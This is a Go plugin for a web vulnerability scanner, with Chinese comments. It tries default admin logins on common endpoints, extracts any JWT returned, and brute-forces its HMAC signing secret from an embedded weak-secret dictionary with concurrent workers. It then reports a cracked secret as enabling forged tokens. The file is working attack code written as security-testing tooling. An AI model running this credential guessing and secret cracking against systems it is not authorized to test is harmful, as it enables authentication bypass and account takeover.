// Package jwt_secret_bruteforce 是 JWT 弱密钥爆破 Go 插件。
//
// 此插件展示了 Go 插件相较于 YAML 模板的核心优势:
//
//  1. 密码学运算 — YAML 模板无法做 HMAC-SHA256/384/512 签名验证,
//     而 Go 可直接使用 crypto/hmac + crypto/sha256 标准库。
//
//  2. 并发爆破 — 使用 worker pool 并行测试大量密钥候选,
//     YAML 模板的 workflow 只能串行发送请求。
//
//  3. 多位置提取 — 从响应头 / Set-Cookie / JSON Body 多处提取 JWT,
//     并支持算法自适应 (HS256/HS384/HS512), 需要条件分支逻辑。
//
//  4. 内嵌字典 — 将常见弱密钥字典编译进二进制, 无需外部文件依赖。
package jwt_secret_bruteforce

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gosleek/gosleek/internal/httpclient"
	"github.com/gosleek/gosleek/internal/plugin"
	"github.com/gosleek/gosleek/internal/utils"
	"github.com/gosleek/gosleek/pkg/types"
)

func init() {
	plugin.Register(&JWTSecretBruteforce{})
}

type JWTSecretBruteforce struct{}

func (p *JWTSecretBruteforce) Meta() types.TemplateMeta {
	return types.TemplateMeta{
		ID:          "jwt-weak-secret-bruteforce",
		Name:        "JWT Weak Secret Brute-force (Go)",
		Description: "检测使用弱密钥签名的 JWT Token。Go 插件通过 HMAC 验证 + 并发爆破, 从响应中提取 JWT 并尝试常见弱密钥。",
		Severity:    "high",
		Author:      "gosleek",
		Tags:        []string{"jwt", "crypto", "bruteforce", "auth", "weak-secret"},
		Reference: []string{
			"https://owasp.org/www-community/attacks/Session_fixation",
			"https://tools.ietf.org/html/rfc7519",
			"https://github.com/wallarm/jwt-secrets",
		},
	}
}

func (p *JWTSecretBruteforce) Fingerprints() []types.FingerprintRule {
	return nil
}

func (p *JWTSecretBruteforce) NeedsOOB() bool { return false }

// commonSecrets 是常见 JWT 弱密钥字典 (编译期内嵌, 无需外部文件)。
// 来源: jwt-secrets 项目 + 常见默认配置。
var commonSecrets = []string{
	// 默认 / 框架自带
	"secret", "secretkey", "secret-key", "secret_key",
	"your-256-bit-secret", "your-secret-key", "your-secret-key-here",
	"supersecret", "super-secret", "my-secret", "my-secret-key",
	// Spring Boot
	"spring-boot-secret", "spring.secret", "jwt-secret",
	// Node.js / Express 常见
	"keyboard cat", "shhh", "shhhhh", "tokenkey", "tokensecret",
	// Django
	"django-insecure", "change-me", "changeme",
	// 常见弱口令
	"123456", "12345678", "1234567890", "password", "password123",
	"admin", "admin123", "root", "test", "test123", "qwerty",
	"abc123", "letmein", "welcome", "monkey", "dragon",
	// 密钥相关
	"key", "private", "private-key", "privatekey",
	"signature", "signing-key", "signingkey",
	// 变体
	"JWT", "jwt", "JWT_SECRET", "JWT_SECRET_KEY",
	"SECRET", "SECRET_KEY", "TOKEN", "TOKEN_SECRET",
	// 其他常见
	"default", "example", "sample", "demo", "localhost",
	"none", "null", "empty", "undefined",
	// Hash/UUID 类
	"00000000", "11111111", "aaaaaaaa", "bbbbbbbb",
	// Flask
	"flask-secret", "flask",
	// Laravel
	"laravel",
	// 长密钥变体
	strings.Repeat("a", 32),
	strings.Repeat("0", 32),
	strings.Repeat("x", 16),
}

// workerCount 控制并发爆破的 goroutine 数量。
const workerCount = 10

func (p *JWTSecretBruteforce) Verify(ctx context.Context, pctx *plugin.Context) (*types.Result, error) {
	target := pctx.Target
	hostname := pctx.TargetInfo.Hostname
	reporter := pctx.Reporter
	pctx.Log.Info("目标: %s (hostname=%s)", target, hostname)

	// 步骤 1: 获取目标响应, 从中提取 JWT
	// 使用常见的 API 入口路径, 同时也检查根路径
	rawReq := fmt.Sprintf(
		"GET / HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Accept: application/json,text/html,*/*\r\n"+
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"+
			"Connection: close\r\n\r\n",
		hostname,
	)
	// pctx.Log.Debug("获取根路径:\n%s", rawReq)
	reporter.LogRequest("获取根路径", 0, 0, rawReq)

	resp, err := pctx.Client.SendRaw(ctx, target, rawReq)
	if err != nil {
		pctx.Log.Debug("请求失败: %v", err)
		return nil, err
	}
	// pctx.Log.Debug("根路径响应: status=%d, headers=%d 条, body=%s", resp.StatusCode, len(resp.Headers), truncate(resp.Body, 300))
	reporter.LogResponse("获取根路径响应", 0, 0, resp.StatusCode, resp.Body, resp.Raw, resp.Time)

	// 步骤 2: 从多个位置提取 JWT
	jwtToken := extractJWT(resp)
	if jwtToken == "" {
		pctx.Log.Debug("根路径响应中未找到 JWT, 尝试常见登录端点")
		// 未找到 JWT, 尝试常见 API 登录端点
		jwtToken = tryLoginEndpoints(ctx, pctx)
		if jwtToken == "" {
			pctx.Log.Info("所有路径均未提取到 JWT, 跳过")
			return nil, nil
		}
	}
	pctx.Log.Info("提取到 JWT (长度=%d, 前40字符=%s)", len(jwtToken), masked(jwtToken))

	// 步骤 3: 解析 JWT 结构, 验证算法是否为 HMAC (HS256/HS384/HS512)
	parts := strings.Split(jwtToken, ".")
	if len(parts) != 3 {
		pctx.Log.Debug("JWT 格式无效 (期望 3 段, 实际 %d 段)", len(parts))
		return nil, nil
	}

	header, err := decodeJWTPart(parts[0])
	if err != nil {
		pctx.Log.Debug("JWT header 解码失败: %v", err)
		return nil, nil
	}

	var hdr struct {
		Alg string `json:"alg"`
		Typ string `json:"typ"`
	}
	if err := json.Unmarshal(header, &hdr); err != nil {
		pctx.Log.Debug("JWT header JSON 解析失败: %v", err)
		return nil, nil
	}
	pctx.Log.Debug("JWT header: alg=%s typ=%s", hdr.Alg, hdr.Typ)

	alg := strings.ToUpper(hdr.Alg)
	if alg != "HS256" && alg != "HS384" && alg != "HS512" {
		// 非对称算法 (RS256/ES256 等) 或 none 无法爆破密钥
		pctx.Log.Info("JWT 算法 %s 不支持密钥爆破 (仅支持 HS256/HS384/HS512)", alg)
		return nil, nil
	}

	signingInput := parts[0] + "." + parts[1]
	expectedSig, err := base64.RawURLEncoding.DecodeString(parts[2])
	if err != nil {
		// 尝试标准 base64
		expectedSig, err = base64.URLEncoding.DecodeString(parts[2])
		if err != nil {
			pctx.Log.Debug("JWT 签名 base64 解码失败: %v", err)
			return nil, nil
		}
	}

	// 步骤 4: 并发爆破密钥
	// Go 插件的核心优势: worker pool 并行验证, YAML 模板只能串行
	pctx.Log.Info("开始并发爆破 JWT HMAC 密钥 (算法=%s, 候选=%d, 并发=%d)", alg, len(commonSecrets), workerCount)
	secretCh := make(chan string, len(commonSecrets))
	for _, s := range commonSecrets {
		secretCh <- s
	}
	close(secretCh)

	type crackedResult struct {
		secret string
	}
	var (
		cracked   crackedResult
		foundOnce sync.Once
		foundVal  int32
		wg        sync.WaitGroup
	)
	start := time.Now()
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for secret := range secretCh {
				if atomic.LoadInt32(&foundVal) == 1 {
					return
				}
				select {
				case <-ctx.Done():
					return
				default:
				}
				if verifyJWTSignature(signingInput, secret, expectedSig, alg) {
					foundOnce.Do(func() {
						cracked.secret = secret
						atomic.StoreInt32(&foundVal, 1)
					})
					return
				}
			}
		}()
	}
	wg.Wait()
	elapsed := time.Since(start)

	crackedSecret := cracked.secret
	if crackedSecret == "" {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}
		pctx.Log.Info("JWT 弱密钥爆破未命中 (耗时 %v, 尝试了 %d 个候选)", elapsed, len(commonSecrets))
		return nil, nil
	}
	pctx.Log.Info("JWT 弱密钥爆破成功 (%v): 密钥=%q, 算法=%s", elapsed, crackedSecret, alg)

	// 步骤 5: 构造结果, 泄露的密钥可能导致 JWT 伪造攻击
	evidence := fmt.Sprintf(
		"JWT 使用弱密钥签名, 已爆破成功:\n"+
			"  算法: %s\n"+
			"  密钥: %q\n"+
			"  候选数: %d\n"+
			"  耗时: %v\n"+
			"  攻击者可利用此密钥伪造任意身份的 JWT Token",
		alg, crackedSecret, len(commonSecrets), elapsed,
	)

	return &types.Result{
		TemplateID:  "jwt-weak-secret-bruteforce",
		Name:        "JWT Weak Secret (Brute-forced)",
		Severity:    "high",
		Description: "JWT Token 使用弱密钥签名, 攻击者可通过暴力破解获取密钥后伪造任意身份的 Token, 实现身份绕过",
		Target:      target,
		MatchedAt:   time.Now().Format("2006-01-02 15:04:05"),
		Tags:        []string{"jwt", "crypto", "bruteforce", "auth", "weak-secret"},
		Reference: []string{
			"https://owasp.org/www-community/attacks/Session_fixation",
			"https://tools.ietf.org/html/rfc7519",
		},
		Evidence:    evidence,
		RawRequest:  rawReq,
		RawResponse: resp.Raw,
		Extracted: map[string]string{
			"jwt_secret":    crackedSecret,
			"jwt_algorithm": alg,
			"jwt_token":     jwtToken,
		},
	}, nil
}

// tryLoginEndpoints 尝试常见 API 登录端点获取 JWT。
func tryLoginEndpoints(ctx context.Context, pctx *plugin.Context) string {
	hostname := pctx.TargetInfo.Hostname
	reporter := pctx.Reporter
	loginPaths := []struct {
		path string
		body string
	}{
		{"/api/login", `{"username":"admin","password":"admin"}`},
		{"/api/v1/login", `{"username":"admin","password":"admin"}`},
		{"/auth/login", `{"username":"admin","password":"admin"}`},
		{"/user/login", `{"username":"admin","password":"123456"}`},
	}
	for _, ep := range loginPaths {
		rawReq := fmt.Sprintf(
			"POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Type: application/json\r\n"+
				"Accept: application/json\r\n"+
				"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"+
				"Connection: close\r\n\r\n%s",
			ep.path, hostname, ep.body,
		)
		// pctx.Log.Debug("尝试登录端点 %s", ep.path)
		reporter.LogRequest("尝试登录端点", 0, 0, rawReq)
		resp, err := pctx.Client.SendRaw(ctx, pctx.Target, rawReq)
		if err != nil {
			pctx.Log.Debug("  %s 请求失败: %v", ep.path, err)
			continue
		}
		//pctx.Log.Debug("  %s status=%d body=%s", ep.path, resp.StatusCode, truncate(resp.Body, 200))
		reporter.LogResponse("尝试登录端点响应", 0, 0, resp.StatusCode, truncate(resp.Body, 200), resp.Raw, resp.Time)
		if token := extractJWT(resp); token != "" {
			pctx.Log.Debug("  %s 提取到 JWT token!", ep.path)
			return token
		}
	}
	return ""
}

// extractJWT 从 HTTP 响应的多个位置提取 JWT Token。
// 检查顺序: Authorization 头 → Set-Cookie → JSON Body 字段。
// 这种多位置提取逻辑在 YAML 模板中难以简洁表达。
func extractJWT(resp *httpclient.Response) string {
	if resp == nil {
		return ""
	}

	// 1. Authorization 头
	if auth := resp.GetHeader("Authorization"); auth != "" {
		if token := stripBearer(auth); isValidJWTFormat(token) {
			return token
		}
	}

	// 2. Set-Cookie 头
	if cookie := resp.GetHeader("Set-Cookie"); cookie != "" {
		if token := extractFromCookie(cookie); isValidJWTFormat(token) {
			return token
		}
	}

	// 3. JSON Body 中的 token 字段
	if resp.Body != "" {
		if token := extractFromJSONBody(resp.Body); isValidJWTFormat(token) {
			return token
		}
		// 4. Body 本身就是 JWT (纯文本)
		trimmed := strings.TrimSpace(resp.Body)
		if isValidJWTFormat(trimmed) {
			return trimmed
		}
	}

	return ""
}

// stripBearer 去掉 "Bearer " 前缀。
func stripBearer(auth string) string {
	auth = strings.TrimSpace(auth)
	if len(auth) > 7 && strings.EqualFold(auth[:7], "Bearer ") {
		return strings.TrimSpace(auth[7:])
	}
	return auth
}

// extractFromCookie 从 Set-Cookie 头中提取 JWT。
// 格式: token=eyJhbG...; Path=/; HttpOnly
func extractFromCookie(cookie string) string {
	for _, part := range strings.Split(cookie, ";") {
		part = strings.TrimSpace(part)
		if idx := strings.Index(part, "="); idx > 0 {
			key := strings.TrimSpace(part[:idx])
			val := strings.TrimSpace(part[idx+1:])
			// 常见 JWT cookie 名
			lowerKey := strings.ToLower(key)
			if lowerKey == "token" || lowerKey == "jwt" || lowerKey == "access_token" ||
				lowerKey == "auth" || lowerKey == "session" {
				return val
			}
		}
	}
	return ""
}

// extractFromJSONBody 从 JSON 响应体中提取 JWT。
// 支持常见字段名: token, access_token, jwt, authToken, data.token
func extractFromJSONBody(body string) string {
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return ""
	}

	// 检查常见顶层字段
	tokenFields := []string{
		"token", "access_token", "accessToken",
		"jwt", "jwt_token", "jwtToken",
		"authToken", "auth_token",
	}
	for _, field := range tokenFields {
		if val, ok := data[field]; ok {
			if s, ok := val.(string); ok && s != "" {
				return s
			}
		}
	}

	// 检查嵌套 data.token 结构
	if dataObj, ok := data["data"]; ok {
		if dataMap, ok := dataObj.(map[string]interface{}); ok {
			for _, field := range tokenFields {
				if val, ok := dataMap[field]; ok {
					if s, ok := val.(string); ok && s != "" {
						return s
					}
				}
			}
		}
	}

	return ""
}

// isValidJWTFormat 快速校验 JWT 格式: 3 段以 "." 分隔, 每段非空。
func isValidJWTFormat(token string) bool {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return false
	}
	for _, p := range parts {
		if p == "" {
			return false
		}
	}
	// JWT header 应以 ey 开头 (base64 编码的 {"alg...)
	return strings.HasPrefix(parts[0], "ey")
}

// decodeJWTPart 解码 JWT 的 base64url 编码部分 (无 padding)。
func decodeJWTPart(part string) ([]byte, error) {
	// 尝试 RawURLEncoding (无 padding)
	if b, err := base64.RawURLEncoding.DecodeString(part); err == nil {
		return b, nil
	}
	// 尝试 URLEncoding (有 padding)
	return base64.URLEncoding.DecodeString(part)
}

// verifyJWTSignature 使用给定密钥验证 JWT 签名。
// 使用 hmac.Equal 做常量时间比较, 防止时序攻击。
func verifyJWTSignature(signingInput, secret string, expectedSig []byte, alg string) bool {
	var hashFunc func() hash.Hash
	switch alg {
	case "HS256":
		hashFunc = sha256.New
	case "HS384":
		hashFunc = sha512.New384
	case "HS512":
		hashFunc = sha512.New
	default:
		return false
	}
	mac := hmac.New(hashFunc, []byte(secret))
	mac.Write([]byte(signingInput))
	return hmac.Equal(mac.Sum(nil), expectedSig)
}

// truncate 截断字符串以便调试输出
func truncate(s string, max int) string {
	return utils.Truncate(s, max)
}

// masked 显示字符串前若干字符, 避免完整 token 泄露到日志
func masked(s string) string {
	return utils.Masked(s, 40)
}
